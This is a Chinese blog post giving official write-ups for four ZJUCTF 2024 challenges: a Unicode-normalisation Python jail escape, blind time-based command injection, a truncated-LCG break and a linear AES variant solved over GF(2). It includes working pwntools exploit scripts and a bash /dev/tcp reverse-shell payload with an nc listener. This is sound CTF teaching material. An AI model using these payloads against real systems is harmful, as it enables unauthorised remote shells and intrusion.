---
title: ZJUCTF 2024 官方部分题解
---

很荣幸参与浙江大学校赛 ZJUCTF 2024 的出题工作。我是 PEP672、Silence、Pseudo 和 Line 这四道题的出题人，下面是它们的官方题解和一些花絮分享。

第一次参与命题，不当之处欢迎批评指正。

---

## 比赛数据

> 本次比赛由浙江大学 AAA 战队主办，上海交通大学 0ops 战队协办，两校同时参赛，面向全体本科生、研究生。比赛从 2024 年 10 月 15 日 20:00 开始到 22 日 20:00 结束，为期一周。

两校共 382 人报名参赛，其中浙大 188 人，交大 194 人。

在我的四道题中，**Silence** 共 14 人解出，**Pseudo** 共 6 人解出，**PEP672** 共 5 人解出，**Line** 共 3 人解出，去除重复总计 19 人。（~~不好意思出太难了~~）

|  题目   |  类型  | 浙江大学 | 上海交通大学 | 总计  |
| :-----: | :----: | :------: | :----------: | :---: |
| Silence |  misc  |    11    |      3       |  14   |
| Pseudo  | crypto |    4     |      2       |   6   |
| PEP672  |  misc  |    3     |      2       |   5   |
|  Line   | crypto |    2     |      1       |   3   |


本次比赛我给了前 10 名做出我的题的选手一人一杯奶茶（QQ 群 15 元红包），奶茶在比赛开始第三天全部送出，其中三杯给了交大的选手。

只有 WuYan 老师一人完成所有题目，而且也成功拿到了四杯奶茶，太强了！

---

## PEP672

::tab
# :star: 题目

```
题目类型：misc
题目难度：medium
题目作者：Xecades

只是限制了一丢丢啦没逝的
```

# :code: 附件

```py
# Hint: Flag has a long name that you probably can't guess.
from string import ascii_letters, digits

banned = ascii_letters + digits + " \"'{(["
cmd = input()

assert not any([c in banned for c in cmd])

exec(cmd)
```

# :asterisk: 部署

Flag 位于 `/data/Here_1s_the_flag_4_u` 路径。

无 root 权限。
::

### 预期解

本题解法很多，下面是出题时想到的解法之一。

标题本身就是提示，搜索 “PEP672” 可以找到 [Unicode-related Security Considerations for Python](https://peps.python.org/pep-0672/) 这个 PEP 提案，其中 [Normalizing identifiers](https://peps.python.org/pep-0672/#normalizing-identifiers) 一节提到了 Python 中的**标识符规范化**问题。例如：

```py
>>> 𝔛𝔢𝔠𝔞𝔡𝔢𝔰 = 123
>>> Xecades
123
```

利用该方法可以绕过 ASCII 字符过滤，但是只对标识符有效，关键词例如 `import`、`class` 等无法绕过。

考虑到题目禁用一切括号，因此尝试使用 Python 内置类的**魔术方法**，例如 `__pos__`、`__add__` 等。由于并不是所有类的魔术方法都可以被覆盖，可以简单遍历一下。

```py
for x in __builtins__.__dict__:
    try:
        exec(f"{x}.__class__.__pos__=input")
        print(x)
    except:
        pass

# __loader__
# quit
# exit
# copyright
# credits
# license
# help
```

在这些类中任选一个，例如 `__loader__`，然后就很简单了。

::fold{title="Exploit" success expand}
```py
from pwn import *

exp = """
__𝔩𝔬𝔞𝔡𝔢𝔯__.__𝔠𝔩𝔞𝔰𝔰__.__𝔭𝔬𝔰__=𝔦𝔫𝔭𝔲𝔱
𝔠𝔪𝔡=+__𝔩𝔬𝔞𝔡𝔢𝔯__
__𝔩𝔬𝔞𝔡𝔢𝔯__.__𝔠𝔩𝔞𝔰𝔰__.__𝔞𝔡𝔡__=𝔢𝔵𝔢𝔠
__𝔩𝔬𝔞𝔡𝔢𝔯__+𝔠𝔪𝔡
"""

r = remote("localhost", 1234)
r.sendline(exp.strip().replace("\n", ";").encode())
r.sendline(b'import os; os.system("/bin/sh")')
r.interactive()
```
::

---

### 非预期解

该解法与预期解原理类似，但是优雅很多。

思路是调用 [`breakpoint()` 函数](https://docs.python.org/3/library/functions.html#breakpoint)，其作用是设置断点并唤起 pdb 调试器，而后者可以当作一个 Python REPL 使用，从而实现 RCE。

::fold{title="Exploit" success expand}
```py
exp = "__𝔩𝔬𝔞𝔡𝔢𝔯__.__𝔠𝔩𝔞𝔰𝔰__.__𝔭𝔬𝔰__=𝔟𝔯𝔢𝔞𝔨𝔭𝔬𝔦𝔫𝔱;+__𝔩𝔬𝔞𝔡𝔢𝔯__"
```
::

---

### 花絮

这是我自己出的最满意的一道题，用极简的题目考最深的知识点，很符合我（理想中的）个人风格。虽然和其他老师的题差距还很大，但起码开了个好头。

这道题原来叫 Magic Python，一语双关对应 Python 的魔术方法，但是后来感觉藏得太深了容易被忽略掉。于是为了大家的游戏体验，干脆直接在标题放上了关于标志符规范化的明确提示，剩下要做的就是基础的绕过了。

我用的生成 Unicode 混淆字符的工具是 [igfonts](https://igfonts.io/)，其实我的 QQ 昵称就是若干年前拿它生成的。（打 CTF 还是得有点闲情雅致，~~哥特体不比你那全角斜体帅多了~~）

::fold{title="夹带私货"}
说到哥特体，本人还是英文书法的狂热粉丝，如果有喜欢英文书法的师傅欢迎联系！🤗

（下面是拙作一幅）

![©Xecades 2024 _Le Petit Prince_](./assets/zjuctf2024-es.jpg)
::

---

## Silence

::tab
# :star: 题目

```
题目类型：misc
题目难度：medium
题目作者：Xecades

这道题直接给你 RCE 诶，还不快来速速拿下！
```

# :download: 附件

:::linkcard{href="/assets/silence"}
silence
:::

# :asterisk: 部署

Flag 位于根目录，文件名超过 80 字节，其中含有感叹号。

无 root 权限。
::

### 预期解

本题有两个非预期，都比预期解简单得多，但事实证明大多数选手都是按照预期解来的。

首先简单逆向。

::fold{title="逆向伪代码" info expand}
```c
int __cdecl __noreturn main()
{
  char command[80]; // [esp+Ch] [ebp-5Ch] BYREF
  FILE *stream; // [esp+5Ch] [ebp-Ch]

  prepare();
  puts("Give me a command and I'll execute it for you ^^");
  while ( 1 )
  {
    printf("$ ");
    input(command, 80);
    mute();
    stream = popen(command, "r");
    pclose(stream);
    restore();
  }
}

int mute()
{
  int fd; // [esp+Ch] [ebp-Ch]

  fd = open("/dev/null", 2);
  if ( fd == -1 )
  {
    perror("open /dev/null");
    exit(1);
  }
  saved_stdin = dup(0);
  saved_stdout = dup(1);
  saved_stderr = dup(2);
  dup2(fd, 0);
  dup2(fd, 1);
  dup2(fd, 2);
  return close(fd);
}

int restore()
{
  dup2(saved_stdin, 0);
  dup2(saved_stdout, 1);
  dup2(saved_stderr, 2);
  close(saved_stdin);
  close(saved_stdout);
  return close(saved_stderr);
}
```
::

可以看到程序接受不超过 $80$ 字节的输入并直接通过 `popen` 执行，但是标准输入、输出、错误流均被提前重定向到 `/dev/null`，没有任何回显。

查阅 [`pclose` 文档](https://pubs.opengroup.org/onlinepubs/009696699/functions/pclose.html)可以发现：

> The `pclose()` function shall close a stream that was opened by `popen()`, **wait for the command to terminate**, and return the termination status of the process that was running the command language interpreter.

`pclose` 会等待程序终止，因此考虑**延时注入**。

构造 payload 如下：

```sh
[ $(ls|xargs|cut -b1) \> 'A' ] && sleep 1
    ^^             ^      ^             ^
```

其效果是先执行 `ls`，并将结果的第一个字符与 `'A'` 比较，如果大于 `'A'` 则延时 $1$ 秒。通过测量程序延时便可得到第一个字节与 `'A'` 的大小关系，按照这个思路逐字节二分爆破即可。

flag 文件名很长，`cat` 时使用通配符即可。

::fold{title="Exploit" success expand}
```py
from pwn import *

context.log_level = "error"
r = None


def execute(cmd, pos, char):
    if char in "\\'":
        char = "\\" + char

    # 延时时间根据实际情况调整
    payload = fr"[ $({cmd}|xargs|cut -b{pos}) \> '{char}' ] && sleep .3".encode()
    assert len(payload) < 80

    r.sendline(payload)

    start = time.time()
    r.recvuntil(b"$ ")
    end = time.time()

    # print(end - start)
    return end - start > .32


def binsearch(cmd):
    pos = 1

    while True:
        l, r = 32, 127

        while l < r:
            mid = (l + r) // 2
            if execute(cmd, pos, chr(mid)):
                l = mid + 1
            else:
                r = mid

        yield chr(l)
        pos += 1


def rce(cmd):
    global r
    r = remote("localhost", 1234)
    r.recvuntil(b"$ ")
    try:
        for char in binsearch(cmd):
            print(char, end="", flush=True)
    except KeyboardInterrupt:
        pass
    except AssertionError:
        print("[!] Payload too long", end="", flush=True)


while True:
    rce(input("> ").strip())
    print()
```
::

---

### 意料之中的非预期

~~意料之中的非预期到底还算不算非预期呢~~

另一种解法是 **Reverse Shell**，要求选手拥有一个可以访问到的服务器和公网 IP。

> 命题时我曾经想过要不要禁用容器网络，但是考虑到预期解耗时很长，对于急着切题的选手来说比较不友好，而且想到这个非预期也有一定的难度，因此最终还是选择了放开。

假设 IP 地址为 `123.123.123.123`，开放端口 `9999`，构造 payload 如下：

```sh
bash -c "bash -i >& /dev/tcp/123.123.123.123/9999 0>&1"
```

然后在服务器上监听即可：

```sh
nc -lvnp 9999
```

---

### 意料之外的非预期

~~选手只需要发现非预期就好了，而出题人要考虑的事情就多了~~

::fold{title="Exploit" success expand}
将输出重定向到 **6 号**文件描述符（File Descriptor，fd），即可将其回显回终端。

![通过 `>&6` 重定向](./assets/zjuctf2024-silence.png)

经过尝试，只有 6 号可行，其余 fd 均无效。
::

我在此方面了解不多，但还是尝试解释一下。

本非预期原理和容器部署密切相关，所以这里先提供本题容器部署的相关文件。

::fold{title="Dockerfile" expand}
```dockerfile
# docker buildx build --platform linux/386 -t silence .
FROM i386/ubuntu:20.04

RUN sed -i "s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g" /etc/apt/sources.list && \
    apt-get update && \
    apt-get install -y socat
RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN useradd ctf

COPY src/silence /
COPY src/run.sh /
COPY src/flag /easy_peasy!this_is_exactly_the_flag_you_are_looking_for!_but_it_has_a_remarkably_long_name_that_exceeds_eighty_bytes_hahaha

RUN chmod 755 /silence /run.sh
USER ctf

CMD ["socat", "tcp-listen:9999,fork", "exec:/run.sh,reuseaddr"]

EXPOSE 9999
```
::

::fold{title="run.sh" expand}
```
#!/bin/bash

/silence
```
::

问题出在 `popen`，如果没有指定 `FD_CLOEXEC` 标志，`popen` 会默认继承父进程的文件描述符。它的父进程是谁呢？进到容器中看看。

```
ctf@6a40e28e0e8b:/$ ps
  PID TTY          TIME CMD
    1 ?        00:00:00 socat
   21 ?        00:00:00 socat
   23 ?        00:00:00 run.sh
   26 ?        00:00:00 silence
   29 ?        00:00:00 ps
```

结合 Dockerfile，可以很清晰地看到 `popen` 开的子进程的父进程是 `silence`，`silence` 的父亲是 `run.sh`，而 `run.sh` 的父亲是用于和选手交互的 `socat`，问题就出在这里。

我们一路向上查询文件描述符，可以发现 6 号 fd **恰好是 `socat` 用于向客户端发送数据的端口**，`popen` 便是把它一路继承了下来。

```
ctf@6a40e28e0e8b:/$ ls -l /proc/21/fd
total 0
lrwx------ 1 ctf ctf 64 Oct 23 00:28 0 -> /dev/null
l-wx------ 1 ctf ctf 64 Oct 23 00:28 1 -> 'pipe:[109068]'
l-wx------ 1 ctf ctf 64 Oct 23 00:28 2 -> 'pipe:[109069]'
lrwx------ 1 ctf ctf 64 Oct 23 00:28 3 -> 'socket:[108281]'
lrwx------ 1 ctf ctf 64 Oct 23 00:28 4 -> 'socket:[108282]'
lrwx------ 1 ctf ctf 64 Oct 23 00:28 5 -> 'socket:[108283]'
lrwx------ 1 ctf ctf 64 Oct 23 00:28 6 -> 'socket:[112005]'
```

因此通过 `>&6` 重定向时，输出甚至没有经过 `socat`，而是直接通过 socket 发送给了客户端。

当然，选手比赛时不可能知道这些，但还是不妨碍有些师傅发现了这个非预期，太强了。

---

### 花絮

本题初稿是没有 `while (1)` 循环的，只允许一次输入，需要反复连接。

预期解在浙江大学校网环境测试耗时虽然很长，但也能勉强接受。但是在距离开赛只有两个小时的时候，Das Schloss 老师告诉我他的题在上交测试的耗时是浙大的好几倍，于是我赶紧改了我的题加上了循环，至少一定程度上避免了反复连接容器的时间开销。

本题的灵感来源是 Web 方向经典的延时注入，但是把一个和 Web 没什么关系的二进制文件放到 Web 显然不太合适，~~众所周知像这种不知道如何分类的情况无脑丢到 Misc 就好了~~。

---

命题时曾有更大的脑洞：为什么 flag 一定是文本文件呢？如果 flag 是一个可执行文件，但是由于没有执行权限，需要一个字节一个字节地读到本地再执行呢？

构造出这样的 Shell Script 并不容易，因为你要处理各种诸如 `\0` 的特殊字符，更进一步，如果我再限制一下命令长度，那题目就会变得非常有意思了。

当然，这样耗时未免太长，而且容易出现各种奇奇怪怪的问题，所以最终还是放弃了这个想法，读者可以思考思考。

---

## Pseudo

::tab
# :star: 题目

```
题目类型：crypto
题目难度：easy
题目作者：Xecades

I've strengthened Java's java.util.Random,
and now it's unbreakable!
```

# :code: 附件

```py
from Crypto.Util.number import long_to_bytes as i2b
from secrets import randbits, randbelow
from hashlib import sha256
from functools import reduce
from SECRET import FLAG

BANNER = """
██████╗ ███████╗███████╗██╗   ██╗██████╗  ██████╗
██╔══██╗██╔════╝██╔════╝██║   ██║██╔══██╗██╔═══██╗
██████╔╝███████╗█████╗  ██║   ██║██║  ██║██║   ██║
██╔═══╝ ╚════██║██╔══╝  ██║   ██║██║  ██║██║   ██║
██║     ███████║███████╗╚██████╔╝██████╔╝╚██████╔╝
╚═╝     ╚══════╝╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝
"""

print(BANNER)


class pyth0n_util_Random:
    def __init__(self):
        self.a = randbits(281)
        self.b = randbits(256)
        self.c = randbits(512)
        self.d = randbits(256)
        self.K = randbelow(self.c)

    def next(self):
        self.K = (self.a * self.K + self.b) % self.c
        return self.K // self.d

    def __str__(self):
        return f"a = {hex(self.a)[2:]}\n" \
            + f"b = {hex(self.b)[2:]}\n" \
            + f"c = {hex(self.c)[2:]}\n" \
            + f"d = {hex(self.d)[2:]}\n"


# You know, pyth0n.util.Random is better than java.util.Random
random = pyth0n_util_Random()
print(random)


# Let's generate some random numbers
R = [random.next() for _ in range(20)]
digest = sha256(reduce(lambda x, y: x + i2b(y), R, b"")).hexdigest()

print(f"R0 = {hex(R[0])[2:]}")
print(f"R1 = {hex(R[1])[2:]}")
print(f"sha256(R)[:16] = {digest[:16]}\n")


# Your turn
for i in range(20):
    Ri = int(input(f"R{i} = "), 16)

    if Ri != R[i]:
        print("Nah, that's not right.")
        exit(1)

print("\nImpressive! Here's your flag:")
print(FLAG)
```
::

### 预期解

题目提示 `java.util.Random`，其[源码](https://developer.classpath.org/doc/java/util/Random-source.html)关键部分如下：

```java
protected synchronized int next(int bits)
{
    seed = (seed * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1);
    return (int) (seed >>> (48 - bits));
}
```

可以发现这是一个截断了低字节的**线性同余生成器**（Truncated LCG），本题与之非常类似，只是最后的模数从 $2$ 的幂次换成了一个大随机数。

本题也可以通过 **CopperSmith** 解决，我没有尝试，这里只提供一个初等数论的解法。

---

按照题目定义，有

$$
\begin{align*}
K_{n+1} &= \left(aK_n + b\right) \bmod c \\[1em]
\overline{K_{n+1}} &= \left\lfloor\dfrac{K_{n+1}}{d}\right\rfloor \\[1em]
S_{n+1} &= K_{n+1} \bmod d = K_{n+1} - d \cdot \overline{K_{n+1}}
\end{align*}
$$

其中 $a$、$b$、$c$、$d$ 已知，$\overline{K_{n+1}}$ 就是题目中的 $R_{n+1}$。目标是得到 $K_{n+1}$。

则有

$$
\begin{align*}
& S_{n+1}+d\cdot\overline{K_{n+1}} \equiv a(S_n+d\cdot\overline{K_n})+b \pmod c \\[1em]
\Rightarrow\quad & S_{n+1} + d\cdot\overline{K_{n+1}} - ad\cdot\overline{K_n} - b\equiv aS_n \pmod c
\end{align*}
$$

令 $r = d-1-S_{n+1}$，则

$$
d\cdot\overline{K_{n+1}} - ad\cdot\overline{K_n} - b + d - 1 \equiv aS_n + r \pmod c
$$

记 $(d\cdot\overline{K_{n+1}}-ad\cdot\overline{K_n} - b+d-1)\bmod c$ 为 $T$，显然 $T$ 是一个已知量，则

$$
T \equiv aS_n + r \pmod c
$$

展开这个同余式，也就是说存在一个 $Q$ 使得

$$
T + cQ = aS_n + r \tag{1}
$$

两侧同时整除 $a$，有

$$
\left\lfloor\frac{T+cQ}{a}\right\rfloor = S_n + \left\lfloor\frac{r}{a}\right\rfloor
$$

而 $0 \leqslant r < d \leqslant a$（此处 $d \leqslant a$ 是因为 $a$ 是 $281$ 位的，远超 $256$ 位的 $d$），因此 $\left\lfloor\dfrac{r}{a}\right\rfloor = 0$，于是

$$
S_n = \left\lfloor\frac{T+cQ}{a}\right\rfloor \tag{2}
$$

在 $(2)$ 的基础上枚举 $Q$。

---

先估计 $Q$ 的范围。

由 $(1)$ 可以得到

$$
Q = \frac{aS_n + r - T}{c}
$$

其中

$$
\begin{align*}
S_n &= K_n \bmod d < d \\[1em]
r &= d-1-S_{n+1} < d
\end{align*}
$$

于是

$$
Q \leqslant \left\lfloor\frac{a(d-1) + (d-1) - T}{c}\right\rfloor = \left\lfloor\frac{(a+1)(d-1)-T}{c}\right\rfloor =: Q_{\max}
$$

$a$ 有 $281\text{bit}$，$d$ 有 $256\text{bit}$，$c$ 有 $512\text{bit}$，$T$ 有 $512\text{bit}$，因此 **$Q_{\max}$ 只有 $25\text{bit}$，可以直接枚举**。

::fold{title="Exploit" success expand}
```py
from Crypto.Util.number import long_to_bytes as i2b
from hashlib import sha256
from functools import reduce
from tqdm import tqdm
from pwn import *


p = remote("localhost", 1234)

p.recvuntil(b"\n\n")
rcv = p.recvuntil(b"\n\n").decode().split("\n")[:-2]
rcv = [int(i.split(" = ")[1], 16) for i in rcv]
a, b, c, d = rcv

info("a = " + hex(a))
info("b = " + hex(b))
info("c = " + hex(c))
info("d = " + hex(d))


rcv = p.recvuntil(b"\n\n").decode().split("\n")[:-2]
rcv = [i.split(" = ")[1] for i in rcv]
R0, R1, sha256_R = rcv
R0, R1 = int(R0, 16), int(R1, 16)

info("R0 = " + hex(R0))
info("R1 = " + hex(R1))
info("sha256(R) = " + sha256_R)


T = (d * R1 - a * d * R0 - b + d - 1) % c
Q_max = ((d - 1) * (a + 1) - T) // c

success(f"Q_max = {Q_max}")


def gen():
    global K
    K = (a * K + b) % c
    return K // d


got = False
for Q in tqdm(range(Q_max + 1)):
    r = (T + c * Q) % a
    if r < d:
        S0 = (T + c * Q) // a
        K0 = R0 * d + S0

        K = K0
        R = [R0] + [gen() for _ in range(19)]
        digest = sha256(reduce(lambda x, y: x + i2b(y), R, b"")).hexdigest()

        assert R[1] == R1

        if digest.startswith(sha256_R):
            got = True
            break

        info("Drop " + hex(K))

assert got, "Failed to find K0"

success("K0 = " + hex(K0))
for _R in R:
    p.sendlineafter(b" = ", hex(_R)[2:].encode())

p.interactive()
```
::

---

### 花絮

这是我这四道题中唯一一道标 easy 难度的题，但是最终只有 6 位师傅解了出来。属实令我有点吃惊。

以 “Truncated LCG” 为关键词搜索，其实能找到很多相关的文章。例如我上面介绍的纯初等数论解法就来自于 StackExchange 上 [How to attack a fixed LCG with partial output?](https://crypto.stackexchange.com/questions/10608/how-to-attack-a-fixed-lcg-with-partial-output) 这篇回答，只需要简单实现一下就好了。

我甚至担心选手发现不了这是一个 Truncated LCG，因此在题目描述中特意提到了 `java.util.Random`，后者就是一个经典的 Truncated LCG。

---

这道题本来打算出成一个系列，第一题是 Java 原生的 Random 库，第二题就是放出来的这道题。但是测试了一下发现 Java 的伪随机实在是太弱了，如果提供两个 $32$ 位伪随机数（也就是两个 int，其中第二个用来验证，可以不是 $32$ 位的，随便给点儿就行），它的 mask 步骤（也就是本题中的 $d$）只是将 $K$ 右移了 $16$ 位，也就是两个 Byte，完完全全可以枚举。

可见密码学安全伪随机有多么重要。

---

## Line

::tab
# :star: 题目

```
题目类型：crypto
题目难度：medium
题目作者：Xecades

听说你数学学得不错？


[Hint 1] 没有必要看懂所有的代码
[Hint 2] Flag 的格式为 ZJUCTF{...}，不妨利用利用已知的字节
[Hint 3] 为避免可能的误解：key 并不一定全是可打印字符
```

# :download: 附件

:::linkcard{href="/assets/line"}
line
:::
::

### 预期解

本题陆续放出三个 Hint，其实第一个才是最重要的。

结合标题和题目描述，可以猜测本题与**线性代数**（Line → Linear）有关。

---

首先逆向。

::fold{title="逆向伪代码" info expand}
```c
int __fastcall main()
{
  __int64 key; // [rsp+8h] [rbp-28h] BYREF
  _QWORD buf[3]; // [rsp+10h] [rbp-20h] BYREF
  int i; // [rsp+2Ch] [rbp-4h]

  prepare();
  buf[0] = 0LL;
  buf[1] = 0LL;
  key = 0LL;
  printf("Give me the flag: ");
  read(0, buf, 0x10uLL);
  printf("Give me the key: ");
  read(0, &key, 8uLL);
  magic(buf, &key, 0xAAALL);
  for ( i = 0; i <= 15; ++i )
    putchar(*(buf + i));
  if ( !memcmp(buf, &cip, 0x10uLL) )
    printf("Nice.");
  return 0;
}

__int64 __fastcall magic(__int64 buf, __int64 key, int round)
{
  int i; // [rsp+2Ch] [rbp-4h]

  add(buf, key);
  for ( i = 1; i < round; ++i )
  {
    magic_spell_1(buf);
    magic_spell_2(buf);
  }
  magic_spell_1(buf);
  return add(buf, key);
}

_BYTE *__fastcall add(__int64 buf, __int64 key)
{
  _BYTE *result; // rax
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i <= 15; ++i )
  {
    result = (i + buf);
    *result ^= *((i & 7) + key);
  }
  return result;
}
```
::

得知 flag 是 $16$ 字节，key 是 $8$ 字节，`magic` 函数利用 key 对 flag 进行 0xAAA 次加密，如果加密后的结果与 `cip` 相等则代表 flag 正确。

没有必要理解具体加密过程，只需要通过尝试发现到关键的一点：**两个 `add` 之间的一切操作都是线性的**，本质上就是乘以一个矩阵 $\mathbf{M}$。而这个 **$\mathbf{M}$ 可以通过测算得到**。

接下来就是线性代数的时间了。

---

`add` 本质上是将 $8$ 字节的 key 复制两遍，然后与 $16$ 字节的 flag 进行异或，而异或就是有限域 $\mathrm{GF}(2)$ 上的加法。

在 $\mathrm{GF}(2)$ 上，记 flag 为 $16 \times 8 = 128$ 维的行向量 $\mathbf{P}$，key 为 $8 \times 8 = 64$ 维行向量 $\mathbf{K_0}$。令 $\mathbf{K} = \left[\mathbf{K_0}\mid\mathbf{K_0}\right]$，则加密过程可以表示为

$$
\mathbf{C} = (\mathbf{P} + \mathbf{K}) \cdot \mathbf{M} + \mathbf{K} \tag{1}
$$

考虑到 flag 的高 7 字节是已知的（即 `ZJUCTF{`），枚举第八个字节，相当于已知 $\mathbf{P}$ 的高 $64$ 位。因此考虑对上述矩阵进行分块。设

$$
\begin{align*}
\mathbf{P} &= \left[\mathbf{P_1}\mid\mathbf{P_2}\right] \\[1em]
\mathbf{C} &= \left[\mathbf{C_1}\mid\mathbf{C_2}\right] \\[1em]
\mathbf{M} &= 
\begin{bmatrix}
\mathbf{M_1} & \mathbf{M_2} \\
\mathbf{M_3} & \mathbf{M_4} \\
\end{bmatrix}
\end{align*}
$$

则有

$$
\left[\mathbf{C_1}\mid\mathbf{C_2}\right] = \left[\mathbf{P_1} + \mathbf{K_0}\mid\mathbf{P_2} + \mathbf{K_0}\right] \cdot \begin{bmatrix}\mathbf{M_1} & \mathbf{M_2} \\ \mathbf{M_3} & \mathbf{M_4}\end{bmatrix} + \left[\mathbf{K_0}\mid\mathbf{K_0}\right]
$$

展开可以得到

$$
\begin{align*}
\mathbf{K_0}(\mathbf{M_1}+\mathbf{M_3}+\mathbf{I})+\mathbf{P_2}\mathbf{M_3}=\mathbf{C_1}-\mathbf{P_1}\mathbf{M_1} \\[1em]
\mathbf{K_0}(\mathbf{M_2}+\mathbf{M_4}+\mathbf{I})+\mathbf{P_2}\mathbf{M_4}=\mathbf{C_2}-\mathbf{P_1}\mathbf{M_2}
\end{align*}
$$

其中 $\mathbf{I}$ 是 $64 \times 64$ 的单位矩阵。设

$$
\begin{matrix}
\begin{align*}
\mathbf{\alpha_1} &= \mathbf{M_1}+\mathbf{M_3}+\mathbf{I} \\[1em]
\mathbf{\beta_1} &= \mathbf{M_3} \\[1em]
\mathbf{\gamma_1} &= \mathbf{C_1}-\mathbf{P_1}\mathbf{M_1}
\end{align*}
&
\begin{align*}
\mathbf{\alpha_2} &= \mathbf{M_2}+\mathbf{M_4}+\mathbf{I} \\[1em]
\mathbf{\beta_2} &= \mathbf{M_4} \\[1em]
\mathbf{\gamma_2} &= \mathbf{C_2}-\mathbf{P_1}\mathbf{M_2}
\end{align*}
\end{matrix}
$$

则

$$
\left[\mathbf{K_0}\mid\mathbf{P_2}\right] \cdot \begin{bmatrix}\mathbf{\alpha_1} & \mathbf{\alpha_2} \\ \mathbf{\beta_1} & \mathbf{\beta_2}\end{bmatrix} = \left[\mathbf{\gamma_1}\mid\mathbf{\gamma_2}\right]
$$

记 $\begin{bmatrix}\mathbf{\alpha_1} & \mathbf{\alpha_2} \\ \mathbf{\beta_1} & \mathbf{\beta_2}\end{bmatrix}$ 为 $\mathbf{A}$，$\left[\mathbf{\gamma_1}\mid\mathbf{\gamma_2}\right]$ 为 $\mathbf{b}$。注意到 $\mathbf{A}$ 和 $\mathbf{b}$ 都是已知的，只需要解 $\mathbf{x} \cdot \mathbf{A}=\mathbf{b}$ 即可。

---

接下来考虑如何测算矩阵 $\mathbf{M}$。

假设输入 $\mathbf{P}$ 和 $\mathbf{K}$，程序输出 $\mathbf{C}$，则 $\mathbf{C}-\mathbf{K}=(\mathbf{P}+\mathbf{K})\mathbf{M}$。

$\mathbf{P}$ 和 $\mathbf{K}$ 是可以控制的，如果构造 $\mathbf{P}+\mathbf{K}$ 为 $[0,\dots,0,1_i,0,\dots,0]$，即第 $i$ 位为 $1$，其余位均为 $0$，那么 $\mathbf{C}-\mathbf{K}$ 就是 $\mathbf{M}$ 的第 $i$ 行。重复 $128$ 次即可得到 $\mathbf{M}$。

::fold{title="Exploit" success expand}
```py
from os import urandom
from sage.all import *
from pwn import *
from string import printable
from itertools import product

context.log_level = "error"


def keyxor(buf, key):
    assert len(key) == 8
    return bytes([buf[i] ^ key[i % 8] for i in range(len(buf))])


def bytes2bin(x, n=128):
    return [int(i) for i in bin(int.from_bytes(x))[2:].zfill(n)]


def bin2bytes(x, n=16):
    return int("".join(str(i) for i in x), 2).to_bytes(n)


def build_mat(fn):
    def payload():
        n = 2 ** 127
        for _ in range(128):
            yield n.to_bytes(16)
            n >>= 1

    mat = []
    for pay in payload():
        mat.append(bytes2bin(fn(pay)))
    return matrix(GF(2), mat)


def ask(key, plain):
    assert len(key) == 8
    assert len(plain) == 16
    r = process("./a.out")
    r.sendafter(b"flag: ", plain)
    r.sendafter(b"key: ", key)
    return r.recvall()


# core 即两个 add 之间的部分
def core(plain):
    key = urandom(8)
    p = keyxor(plain, key)
    c = ask(key, p)
    return keyxor(c, key)


C = [213, 227, 152, 198, 148, 194, 40, 2, 183, 214, 143, 213, 39, 75, 135, 224]
C = bytes2bin(bytes(C))
C = vector(GF(2), C)  # 1x128

C1, C2 = C[0:64], C[64:]

M = build_mat(core)  # 128x128
M1, M2, M3, M4 = M[0:64, 0:64], M[0:64, 64:], M[64:, 0:64], M[64:, 64:]

I = matrix.identity(64)

alpha1, alpha2 = M1 + M3 + I, M2 + M4 + I
beta1, beta2 = M3, M4


def verify_core():
    data = urandom(16)
    D = vector(GF(2), bytes2bin(data))
    assert core(data) == bin2bytes(D * M)


verify_core()


def exp():
    for crack in printable:
        P1 = bytes2bin(b"ZJUCTF{" + crack.encode(), 64)
        P1 = vector(GF(2), P1)
        gamma1 = C1 - P1 * M1
        gamma2 = C2 - P1 * M2

        # solve:
        # K * alpha1 + P2 * beta1 = gamma1
        # K * alpha2 + P2 * beta2 = gamma2

        A = block_matrix([[alpha1, alpha2], [beta1, beta2]])
        b = vector(GF(2), list(gamma1) + list(gamma2))

        try:
            sol = A.solve_left(b)
            P2 = sol[64:]

            flag = list(P1) + list(P2)
            print(bin2bytes(flag))
        except:
            pass


exp()
```
::

---

### 花絮

这道题其实有一个更简单的做法，如果把 $\left[\mathbf{P}\mid\mathbf{K_0}\right]$ 看成一个整体，那么这整个 `magic` 函数就是线性的，由 $(1)$ 式很容易证明。但是需要注意在这种情况下要构造的矩阵就不是方阵了。

---

不少选手都发现了 `magic` 函数实际上是一个经过大幅改编的 AES，我剔除了 AES 加密过程中的非线性部分（例如 S-box）。

事实证明在改编代码的时候我无意中改错了些东西（$\mathrm{GF}(2^8)$ 中的乘法函数），但是由于并没有影响整体的线性性，所以无伤大雅。

作为一道原滋原味的 crypto 而不是 rev 题，我本来就没打算让选手看懂这个加密过程，而且完成这道题也无需看懂，所以我是尽量朝着复杂的方向去改编的。

当然，赛后还是发现有不少师傅硬着头皮去逆向了，真心佩服。（虽然因为没有 key 就算逆出来也做不了）

---

## 结语

:v{7rem}

<center>欢迎加入浙江大学 AAA 战队。</center>

:v{8rem}
